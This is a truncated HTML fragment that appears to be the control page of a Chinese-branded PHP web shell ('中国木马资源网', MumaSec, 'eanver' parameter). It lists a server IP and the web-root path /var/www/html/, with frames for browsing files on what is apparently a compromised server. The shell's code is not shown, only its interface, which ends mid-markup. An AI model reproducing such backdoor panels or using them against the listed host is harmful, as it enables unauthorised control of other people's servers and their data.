...
<html><title>中国木马资源网-WwW.MumaSec.TK </title>
<table width='100%'><tr><td width='150' align='center'>132.232.103.235</td><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'><input name='path' style='width:100%' value='/var/www/html/'></td><td width='140' align='center'><input name='Submit' type='submit' value='跳到'> <input type='submit' value='刷新' onclick='main.location.reload()'></td></tr></form></table><table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'>
</iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'>
